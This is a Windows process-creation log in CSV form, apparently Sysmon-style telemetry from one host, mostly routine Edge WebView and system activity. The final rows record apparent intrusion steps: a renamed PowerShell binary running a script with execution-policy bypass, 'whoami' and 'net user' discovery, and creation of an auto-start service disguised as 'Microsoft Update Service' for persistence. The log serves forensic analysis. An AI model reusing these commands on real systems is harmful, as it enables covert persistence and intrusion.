"Sep 16, 2025 2:51:44 PM",slflarewinsysmo,slflare,msedgewebview2.exe,"""msedgewebview2.exe"" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --noerrdialogs --user-data-dir=""C:\Users\SLFlare\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=SearchApp.exe --webview-exe-version=10.0.19041.6282 --embedded-browser-webview=1 --startup-read-main-dll --metrics-shmem-handle=2184,i,13906477518385615147,15626517959774228,524288 --field-trial-handle=1912,i,3704950018702456231,6645339648170424040,262144 --enable-features=ForceSWDCompWhenDCompFallbackRequired,msAggressiveCacheTrimming,msCustomDataPartition,msEmbeddedBrowserVisualHosting,msWebView2NoTabForScreenShare,msWebViewAppLifeCycleWorkaround --disable-features=BackForwardCache,BackgroundTabLoadingFromPerformanceManager,CloseOmniboxPopupOnInactiveAreaClick,CollectAVProductsInfo,CollectCodeIntegrityInfo,EnableHangWatcher,FilterAdsOnAbusiveSites,GetWifiProtocol,LoginDetection,MediaFoundationCameraUsageMonitoring,PreconnectToSearch,SafetyHub,SegmentationPlatform,SpareRendererForSitePerProcess,Ukm,WebPayments,msAITrackerClassification,msAbydosForWindowlessWV2,msAffirmVirtualCard,msAllowChromeWebstore,msAllowMSAPrtSSOForNonMSAProfile,msApplicationGuard,msAskBeforeClosingMultipleTabs,msAutoToggleAADPrtSSOForNonAADProfile,msAutofillEdgeCoupons,msAutofillEdgeCouponsAutoApply,msAutofillEdgeServiceRequest,msAutofillEnableEdgeSuggestions,msAutomaticTabFreeze,msBrowserSettingsSupported,msCoarseGeolocationService,msDataProtection,msDesktopMode,msDesktopRewards,msDisableVariationsSeedFetchThrottling,msEEProactiveHistory,msETFOffstoreExtensionFileDataCollection,msETFPasswordTheftDNRActionSignals,msEdgeAdPlatformUI,msEdgeAddWebCapturetoCollections,msEdgeAutofillShowDeployedPassword,msEdgeCaptureSelectionInPDF,msEdgeCloudConfigService,msEdgeCloudConfigServiceV2,msEdgeCohorts,msEdgeCollectionsPrismExperiment1,msEdgeCollectionsPrismOverallMigration,msEdgeComposeNext,msEdgeEnableNurturingFramework,msEdgeEnclavePrefsBasic,msEdgeEnclavePrefsNotification,msEdgeFaviconService,msEdgeHJTelemetry,msEdgeHubAppSkype,msEdgeImageEditorUI,msEdgeLinkDoctor,msEdgeMouseGestureDefaultEnabled,msEdgeMouseGestureSupported,msEdgeNewDeviceFre,msEdgeOnRampFRE,msEdgeOnRampImport,msEdgePDFCMHighlightUX,msEdgePasswordIris,msEdgePasswordIrisSaveBubble,msEdgeProngPersonalization,msEdgeReadingView,msEdgeRose,msEdgeScreenshotUI,msEdgeSendTabToSelf,msEdgeSettingsImport,msEdgeSettingsImportV2,msEdgeShoppingPersistentStorage,msEdgeShoppingUI,msEdgeSmartFind,msEdgeSuperDragDefaultEnabled,msEdgeSuperDragDropSupported,msEdgeTranslate,msEdgeUpdatesMoreMenuPill,msEdgeWebCapture,msEdgeWebCaptureUniformExperience,msEdgeWebContentFilteringFeedback,msEdgeWorkSearchBanner,msEnableCustomJobMemoryLimitsOnXbox,msEnableMIPForPDF,msEnablePdfUpsell,msEnableThirdPartyScanning,msEnableWebSignInCta,msEnableWebToBrowserSignIn,msEndpointDlp,msEntityExtraction,msExtensionTelemetryFramework,msExternalTaskManager,msFileSystemAccessDirectoryIterationBlocklistCheck,msForceBrowserSignIn,msForeignSessionsPage,msGeolocationAccessService,msGeolocationOSLocationPermissionFallback,msGeolocationSQMService,msGeolocationService,msGrowthInfraLaunchSourceLogging,msGuidedSwitchAllowed,msHubPinPersist,msImplicitSignin,msIrm,msIrmv2,msKlarnaVirtualCard,msLlmConsumerDlpPurview,msLoadStatistics,msLogIsEdgePinnedToTaskbarOnLaunch,msMIPCrossTenantPdfViewSupport,msMdatpWebSiteDlp,msNotificationPermissionForPWA,msNumberOfSitesToPin,msNurturingGlobalSitePinningOnCloseModal,msNurturingSitePinningCITopSites,msNurturingSitePinningWithWindowsConsent,msOnHoverSearchInSidebar,msOpenOfficeDocumentsInWebViewer,msPageInteractionRestrictionRevoke,msPasswordBreachDetection,msPdfAnnotationsVisibility,msPdfDataRecovery,msPdfDigitalSignatureRead,msPdfFreeText,msPdfFreeTextForCJK,msPdfHighlightMode,msPdfInking,msPdfKeyphraseSupport,msPdfOOUI,msPdfPopupMarkerRenderer,msPdfShare,msPdfSharedLibrary,msPdfTextNote,msPdfTextNoteMoreMenu,msPdfThumbnailCache,msPdfUnderside,msPdfViewRestore,msPersonalizationUMA,msPriceComparison,msPrintInWebView2,msPromptDefaultHandlerForPDF,msReactiveSearch,msReadAloud,msReadAloudPdf,msRedirectToShoreline,msRevokeExtensions,msSaasDlp,msShoppingTrigger,msShorelineSearch,msShorelineSearchFindOnPageWebUI,msShowOfflineGameEntrance,msShowReadAloudIconInAddressBar,msShowUXForAADPrtSSOForNonAADProfile,msSitePinningWithoutUi,msSuspendMessageForNewSessionWhenHavingPendingNavigation,msSyncEdgeCollections,msTabResourceStats,msTokenizationAutofillInlineEnabled,msTouchMode,msTriggeringSignalGenerator,msUserUnderstanding,msVideoSuperResolutionUI,msWalletBuyNow,msWalletCheckout,msWalletDiagnosticDataLogger,msWalletHubEntry,msWalletHubIntlP3,msWalletPartialCard,msWalletPasswordCategorization,msWalletPasswordCategorizationPlatformExpansion,msWalletTokenizationCardMetadata,msWalletTokenizedAutofill,msWebAssist,msWebAssistHistorySearchService,msWebOOUI,msWindowsTaskManager,msWindowsUserActivities,msZipPayVirtualCard --variations-seed-version --mojo-platform-channel-handle=2216 /prefetch:3",msedgewebview2.exe,"""msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=SearchApp.exe --webview-exe-version=10.0.19041.6282 --user-data-dir=""C:\Users\SLFlare\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --enable-features=msEmbeddedBrowserVisualHosting --lang=en-US --mojo-named-platform-channel-pipe=2220.6380.10211842261493070152",159.26.106.84
"Sep 16, 2025 2:51:45 PM",slflarewinsysmo,slflare,msedgewebview2.exe,"""msedgewebview2.exe"" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-US --service-sandbox-type=service --noerrdialogs --user-data-dir=""C:\Users\SLFlare\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=SearchApp.exe --webview-exe-version=10.0.19041.6282 --embedded-browser-webview=1 --startup-read-main-dll --metrics-shmem-handle=2432,i,11366444114147772634,18116883026763991945,524288 --field-trial-handle=1912,i,3704950018702456231,6645339648170424040,262144 --enable-features=ForceSWDCompWhenDCompFallbackRequired,msAggressiveCacheTrimming,msCustomDataPartition,msEmbeddedBrowserVisualHosting,msWebView2NoTabForScreenShare,msWebViewAppLifeCycleWorkaround --disable-features=BackForwardCache,BackgroundTabLoadingFromPerformanceManager,CloseOmniboxPopupOnInactiveAreaClick,CollectAVProductsInfo,CollectCodeIntegrityInfo,EnableHangWatcher,FilterAdsOnAbusiveSites,GetWifiProtocol,LoginDetection,MediaFoundationCameraUsageMonitoring,PreconnectToSearch,SafetyHub,SegmentationPlatform,SpareRendererForSitePerProcess,Ukm,WebPayments,msAITrackerClassification,msAbydosForWindowlessWV2,msAffirmVirtualCard,msAllowChromeWebstore,msAllowMSAPrtSSOForNonMSAProfile,msApplicationGuard,msAskBeforeClosingMultipleTabs,msAutoToggleAADPrtSSOForNonAADProfile,msAutofillEdgeCoupons,msAutofillEdgeCouponsAutoApply,msAutofillEdgeServiceRequest,msAutofillEnableEdgeSuggestions,msAutomaticTabFreeze,msBrowserSettingsSupported,msCoarseGeolocationService,msDataProtection,msDesktopMode,msDesktopRewards,msDisableVariationsSeedFetchThrottling,msEEProactiveHistory,msETFOffstoreExtensionFileDataCollection,msETFPasswordTheftDNRActionSignals,msEdgeAdPlatformUI,msEdgeAddWebCapturetoCollections,msEdgeAutofillShowDeployedPassword,msEdgeCaptureSelectionInPDF,msEdgeCloudConfigService,msEdgeCloudConfigServiceV2,msEdgeCohorts,msEdgeCollectionsPrismExperiment1,msEdgeCollectionsPrismOverallMigration,msEdgeComposeNext,msEdgeEnableNurturingFramework,msEdgeEnclavePrefsBasic,msEdgeEnclavePrefsNotification,msEdgeFaviconService,msEdgeHJTelemetry,msEdgeHubAppSkype,msEdgeImageEditorUI,msEdgeLinkDoctor,msEdgeMouseGestureDefaultEnabled,msEdgeMouseGestureSupported,msEdgeNewDeviceFre,msEdgeOnRampFRE,msEdgeOnRampImport,msEdgePDFCMHighlightUX,msEdgePasswordIris,msEdgePasswordIrisSaveBubble,msEdgeProngPersonalization,msEdgeReadingView,msEdgeRose,msEdgeScreenshotUI,msEdgeSendTabToSelf,msEdgeSettingsImport,msEdgeSettingsImportV2,msEdgeShoppingPersistentStorage,msEdgeShoppingUI,msEdgeSmartFind,msEdgeSuperDragDefaultEnabled,msEdgeSuperDragDropSupported,msEdgeTranslate,msEdgeUpdatesMoreMenuPill,msEdgeWebCapture,msEdgeWebCaptureUniformExperience,msEdgeWebContentFilteringFeedback,msEdgeWorkSearchBanner,msEnableCustomJobMemoryLimitsOnXbox,msEnableMIPForPDF,msEnablePdfUpsell,msEnableThirdPartyScanning,msEnableWebSignInCta,msEnableWebToBrowserSignIn,msEndpointDlp,msEntityExtraction,msExtensionTelemetryFramework,msExternalTaskManager,msFileSystemAccessDirectoryIterationBlocklistCheck,msForceBrowserSignIn,msForeignSessionsPage,msGeolocationAccessService,msGeolocationOSLocationPermissionFallback,msGeolocationSQMService,msGeolocationService,msGrowthInfraLaunchSourceLogging,msGuidedSwitchAllowed,msHubPinPersist,msImplicitSignin,msIrm,msIrmv2,msKlarnaVirtualCard,msLlmConsumerDlpPurview,msLoadStatistics,msLogIsEdgePinnedToTaskbarOnLaunch,msMIPCrossTenantPdfViewSupport,msMdatpWebSiteDlp,msNotificationPermissionForPWA,msNumberOfSitesToPin,msNurturingGlobalSitePinningOnCloseModal,msNurturingSitePinningCITopSites,msNurturingSitePinningWithWindowsConsent,msOnHoverSearchInSidebar,msOpenOfficeDocumentsInWebViewer,msPageInteractionRestrictionRevoke,msPasswordBreachDetection,msPdfAnnotationsVisibility,msPdfDataRecovery,msPdfDigitalSignatureRead,msPdfFreeText,msPdfFreeTextForCJK,msPdfHighlightMode,msPdfInking,msPdfKeyphraseSupport,msPdfOOUI,msPdfPopupMarkerRenderer,msPdfShare,msPdfSharedLibrary,msPdfTextNote,msPdfTextNoteMoreMenu,msPdfThumbnailCache,msPdfUnderside,msPdfViewRestore,msPersonalizationUMA,msPriceComparison,msPrintInWebView2,msPromptDefaultHandlerForPDF,msReactiveSearch,msReadAloud,msReadAloudPdf,msRedirectToShoreline,msRevokeExtensions,msSaasDlp,msShoppingTrigger,msShorelineSearch,msShorelineSearchFindOnPageWebUI,msShowOfflineGameEntrance,msShowReadAloudIconInAddressBar,msShowUXForAADPrtSSOForNonAADProfile,msSitePinningWithoutUi,msSuspendMessageForNewSessionWhenHavingPendingNavigation,msSyncEdgeCollections,msTabResourceStats,msTokenizationAutofillInlineEnabled,msTouchMode,msTriggeringSignalGenerator,msUserUnderstanding,msVideoSuperResolutionUI,msWalletBuyNow,msWalletCheckout,msWalletDiagnosticDataLogger,msWalletHubEntry,msWalletHubIntlP3,msWalletPartialCard,msWalletPasswordCategorization,msWalletPasswordCategorizationPlatformExpansion,msWalletTokenizationCardMetadata,msWalletTokenizedAutofill,msWebAssist,msWebAssistHistorySearchService,msWebOOUI,msWindowsTaskManager,msWindowsUserActivities,msZipPayVirtualCard --variations-seed-version --mojo-platform-channel-handle=2632 /prefetch:8",msedgewebview2.exe,"""msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=SearchApp.exe --webview-exe-version=10.0.19041.6282 --user-data-dir=""C:\Users\SLFlare\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --enable-features=msEmbeddedBrowserVisualHosting --lang=en-US --mojo-named-platform-channel-pipe=2220.6380.10211842261493070152",159.26.106.84
"Sep 16, 2025 2:51:45 PM",slflarewinsysmo,slflare,msedgewebview2.exe,"""msedgewebview2.exe"" --type=renderer --noerrdialogs --user-data-dir=""C:\Users\SLFlare\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=SearchApp.exe --webview-exe-version=10.0.19041.6282 --embedded-browser-webview=1 --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --js-flags=""--expose-gc --ms-user-locale="" --time-ticks-at-unix-epoch=-1758048084299704 --launch-time-ticks=621189990 --ram-no-pressure-read-main-dll --metrics-shmem-handle=3460,i,4173574439834776941,4635381963538480990,2097152 --field-trial-handle=1912,i,3704950018702456231,6645339648170424040,262144 --enable-features=ForceSWDCompWhenDCompFallbackRequired,msAggressiveCacheTrimming,msCustomDataPartition,msEmbeddedBrowserVisualHosting,msWebView2NoTabForScreenShare,msWebViewAppLifeCycleWorkaround --disable-features=BackForwardCache,BackgroundTabLoadingFromPerformanceManager,CloseOmniboxPopupOnInactiveAreaClick,CollectAVProductsInfo,CollectCodeIntegrityInfo,EnableHangWatcher,FilterAdsOnAbusiveSites,GetWifiProtocol,LoginDetection,MediaFoundationCameraUsageMonitoring,PreconnectToSearch,SafetyHub,SegmentationPlatform,SpareRendererForSitePerProcess,Ukm,WebPayments,msAITrackerClassification,msAbydosForWindowlessWV2,msAffirmVirtualCard,msAllowChromeWebstore,msAllowMSAPrtSSOForNonMSAProfile,msApplicationGuard,msAskBeforeClosingMultipleTabs,msAutoToggleAADPrtSSOForNonAADProfile,msAutofillEdgeCoupons,msAutofillEdgeCouponsAutoApply,msAutofillEdgeServiceRequest,msAutofillEnableEdgeSuggestions,msAutomaticTabFreeze,msBrowserSettingsSupported,msCoarseGeolocationService,msDataProtection,msDesktopMode,msDesktopRewards,msDisableVariationsSeedFetchThrottling,msEEProactiveHistory,msETFOffstoreExtensionFileDataCollection,msETFPasswordTheftDNRActionSignals,msEdgeAdPlatformUI,msEdgeAddWebCapturetoCollections,msEdgeAutofillShowDeployedPassword,msEdgeCaptureSelectionInPDF,msEdgeCloudConfigService,msEdgeCloudConfigServiceV2,msEdgeCohorts,msEdgeCollectionsPrismExperiment1,msEdgeCollectionsPrismOverallMigration,msEdgeComposeNext,msEdgeEnableNurturingFramework,msEdgeEnclavePrefsBasic,msEdgeEnclavePrefsNotification,msEdgeFaviconService,msEdgeHJTelemetry,msEdgeHubAppSkype,msEdgeImageEditorUI,msEdgeLinkDoctor,msEdgeMouseGestureDefaultEnabled,msEdgeMouseGestureSupported,msEdgeNewDeviceFre,msEdgeOnRampFRE,msEdgeOnRampImport,msEdgePDFCMHighlightUX,msEdgePasswordIris,msEdgePasswordIrisSaveBubble,msEdgeProngPersonalization,msEdgeReadingView,msEdgeRose,msEdgeScreenshotUI,msEdgeSendTabToSelf,msEdgeSettingsImport,msEdgeSettingsImportV2,msEdgeShoppingPersistentStorage,msEdgeShoppingUI,msEdgeSmartFind,msEdgeSuperDragDefaultEnabled,msEdgeSuperDragDropSupported,msEdgeTranslate,msEdgeUpdatesMoreMenuPill,msEdgeWebCapture,msEdgeWebCaptureUniformExperience,msEdgeWebContentFilteringFeedback,msEdgeWorkSearchBanner,msEnableCustomJobMemoryLimitsOnXbox,msEnableMIPForPDF,msEnablePdfUpsell,msEnableThirdPartyScanning,msEnableWebSignInCta,msEnableWebToBrowserSignIn,msEndpointDlp,msEntityExtraction,msExtensionTelemetryFramework,msExternalTaskManager,msFileSystemAccessDirectoryIterationBlocklistCheck,msForceBrowserSignIn,msForeignSessionsPage,msGeolocationAccessService,msGeolocationOSLocationPermissionFallback,msGeolocationSQMService,msGeolocationService,msGrowthInfraLaunchSourceLogging,msGuidedSwitchAllowed,msHubPinPersist,msImplicitSignin,msIrm,msIrmv2,msKlarnaVirtualCard,msLlmConsumerDlpPurview,msLoadStatistics,msLogIsEdgePinnedToTaskbarOnLaunch,msMIPCrossTenantPdfViewSupport,msMdatpWebSiteDlp,msNotificationPermissionForPWA,msNumberOfSitesToPin,msNurturingGlobalSitePinningOnCloseModal,msNurturingSitePinningCITopSites,msNurturingSitePinningWithWindowsConsent,msOnHoverSearchInSidebar,msOpenOfficeDocumentsInWebViewer,msPageInteractionRestrictionRevoke,msPasswordBreachDetection,msPdfAnnotationsVisibility,msPdfDataRecovery,msPdfDigitalSignatureRead,msPdfFreeText,msPdfFreeTextForCJK,msPdfHighlightMode,msPdfInking,msPdfKeyphraseSupport,msPdfOOUI,msPdfPopupMarkerRenderer,msPdfShare,msPdfSharedLibrary,msPdfTextNote,msPdfTextNoteMoreMenu,msPdfThumbnailCache,msPdfUnderside,msPdfViewRestore,msPersonalizationUMA,msPriceComparison,msPrintInWebView2,msPromptDefaultHandlerForPDF,msReactiveSearch,msReadAloud,msReadAloudPdf,msRedirectToShoreline,msRevokeExtensions,msSaasDlp,msShoppingTrigger,msShorelineSearch,msShorelineSearchFindOnPageWebUI,msShowOfflineGameEntrance,msShowReadAloudIconInAddressBar,msShowUXForAADPrtSSOForNonAADProfile,msSitePinningWithoutUi,msSuspendMessageForNewSessionWhenHavingPendingNavigation,msSyncEdgeCollections,msTabResourceStats,msTokenizationAutofillInlineEnabled,msTouchMode,msTriggeringSignalGenerator,msUserUnderstanding,msVideoSuperResolutionUI,msWalletBuyNow,msWalletCheckout,msWalletDiagnosticDataLogger,msWalletHubEntry,msWalletHubIntlP3,msWalletPartialCard,msWalletPasswordCategorization,msWalletPasswordCategorizationPlatformExpansion,msWalletTokenizationCardMetadata,msWalletTokenizedAutofill,msWebAssist,msWebAssistHistorySearchService,msWebOOUI,msWindowsTaskManager,msWindowsUserActivities,msZipPayVirtualCard --variations-seed-version --mojo-platform-channel-handle=3484 /prefetch:1",msedgewebview2.exe,"""msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=SearchApp.exe --webview-exe-version=10.0.19041.6282 --user-data-dir=""C:\Users\SLFlare\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --enable-features=msEmbeddedBrowserVisualHosting --lang=en-US --mojo-named-platform-channel-pipe=2220.6380.10211842261493070152",159.26.106.84
"Sep 16, 2025 2:51:59 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:ShellFeedsUI.AppXnj65k2d1a1rnztt2t2nng5ctmk3e76pn.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:51:59 PM",slflarewinsysmo,slflare,ShellExperienceHost.exe,"""ShellExperienceHost.exe"" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:52:00 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""BackgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:52:03 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""BackgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:52:05 PM",slflarewinsysmo,slflare,rundll32.exe,"rundll32.exe shell32.dll,SHCreateLocalServerRunDll {c82192ee-6cb5-4bc0-9ef0-fb818773790a} -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:52:06 PM",slflarewinsysmo,slflare,smartscreen.exe,smartscreen.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:52:07 PM",slflarewinsysmo,slflare,powershell.exe,powershell.exe,explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 2:52:07 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 2:54:36 PM",slflarewinsysmo,slflare,UserOOBEBroker.exe,UserOOBEBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:54:36 PM",slflarewinsysmo,slflare,FileCoAuth.exe,"""FileCoAuth.exe"" -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:57:03 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""BackgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:57:14 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""BackgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:57:16 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:57:47 PM",slflarewinsysmo,slflare,BraveUpdate.exe,"""BraveUpdate.exe"" /ua /installsource scheduler",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:58:51 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe Install $(Arg0),svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:58:51 PM",slflarewinsysmo,slflare,ClipESUConsumer.exe,"""ClipESUConsumer.exe"" -evaluateEligibility",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:59:17 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe Install $(Arg0),svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:59:19 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:59:20 PM",slflarewinsysmo,slflare,cleanmgr.exe,"""cleanmgr.exe"" /autoclean /d C:",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:59:23 PM",slflarewinsysmo,slflare,sdiagnhost.exe,sdiagnhost.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:59:23 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,sdiagnhost.exe,sdiagnhost.exe -Embedding,159.26.106.84
"Sep 16, 2025 3:01:18 PM",slflarewinsysmo,slflare,DeviceCensus.exe,"""devicecensus.exe"" UserCxt",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:01:40 PM",slflarewinsysmo,slflare,DismHost.exe,dismhost.exe {7358A319-49EE-410B-A0E9-3FD0A67D4FFB},cleanmgr.exe,"""cleanmgr.exe"" /autoclean /d C:",159.26.106.84
"Sep 16, 2025 3:02:43 PM",slflarewinsysmo,slflare,smartscreen.exe,smartscreen.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:04:35 PM",slflarewinsysmo,slflare,FileCoAuth.exe,"""FileCoAuth.exe"" -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:05:54 PM",slflarewinsysmo,slflare,taskhostw.exe,"taskhostw.exe ""C:\Windows\system32\cleanmgr.exe"" /autoclean /d C:",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 3:06:04 PM",slflarewinsysmo,slflare,net.exe,"""net.exe"" user",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:06:05 PM",slflarewinsysmo,slflare,net1.exe,net1 user,net.exe,"""net.exe"" user",159.26.106.84
"Sep 16, 2025 3:12:33 PM",slflarewinsysmo,slflare,smartscreen.exe,smartscreen.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:14:36 PM",slflarewinsysmo,slflare,FileCoAuth.exe,"""FileCoAuth.exe"" -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:16:43 PM",slflarewinsysmo,slflare,powershell.exe,powershell.exe,explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 3:16:44 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:17:01 PM",slflarewinsysmo,slflare,TextInputHost.exe,"""TextInputHost.exe"" -ServerName:InputApp.AppXk0k6mrh4r2q0ct33a9wgbez0x7v9cz5y.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:17:02 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{7966B4D8-4FDC-4126-A10B-39A3209AD251},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:17:02 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:17:06 PM",slflarewinsysmo,slflare,notepad.exe,notepad.exe,explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 3:17:43 PM",slflarewinsysmo,slflare,notepad.exe,notepad.exe,explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 3:20:37 PM",slflarewinsysmo,slflare,powershell.exe,powershell.exe,explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 3:20:37 PM",slflarewinsysmo,slflare,powershell.exe,powershell.exe,explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 3:20:37 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:20:37 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:22:30 PM",slflarewinsysmo,slflare,FileCoAuth.exe,"""FileCoAuth.exe"" -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:22:32 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:23:17 PM",slflarewinsysmo,slflare,rundll32.exe,"rundll32.exe C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:23:56 PM",slflarewinsysmo,slflare,notepad.exe,"""NOTEPAD.EXE"" C:\Windows\System32\LogFiles\WMI\wmi_maintenance.txt",explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 3:26:22 PM",slflarewinsysmo,slflare,powershell_ise.exe,"""powershell_ise.exe"" ""C:\Windows\System32\LogFiles\WMI\wmi_maintenance.ps1""",explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 3:32:31 PM",slflarewinsysmo,slflare,smartscreen.exe,smartscreen.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 3:38:40 PM",slflarewinsysmo,slflare,msupdate.exe,"""msupdate.exe"" -ExecutionPolicy Bypass -File C:\Users\Public\update_check.ps1 ",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:38:40 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,msupdate.exe,"""msupdate.exe"" -ExecutionPolicy Bypass -File C:\Users\Public\update_check.ps1 ",159.26.106.84
"Sep 16, 2025 3:38:42 PM",slflarewinsysmo,slflare,whoami.exe,whoami.exe,msupdate.exe,"""msupdate.exe"" -ExecutionPolicy Bypass -File C:\Users\Public\update_check.ps1 ",159.26.106.84
"Sep 16, 2025 3:39:45 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c ""sc.exe create ""MSUpdateService"" binPath= ""powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\Microsoft\Windows\Update\mscloudsync.ps1"" DisplayName= ""Microsoft Update Service"" start= auto""",powershell.exe,powershell.exe,159.26.106.84
"Sep 16, 2025 3:39:45 PM",slflarewinsysmo,slflare,sc.exe,"sc.exe  create ""MSUpdateService"" binPath= ""powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\Microsoft\Windows\Update\mscloudsync.ps1"" DisplayName= ""Microsoft Update Service"" start= auto",cmd.exe,"""cmd.exe"" /c ""sc.exe create ""MSUpdateService"" binPath= ""powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\Microsoft\Windows\Update\mscloudsync.ps1"" DisplayName= ""Microsoft Update Service"" start= auto""",159.26.106.84
"Sep 16, 2025 3:39:45 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c ""sc.exe description ""MSUpdateService"" ""Provides automated Microsoft product updates and synchronization""""",powershell.exe,powershell.exe,159.26.106.84
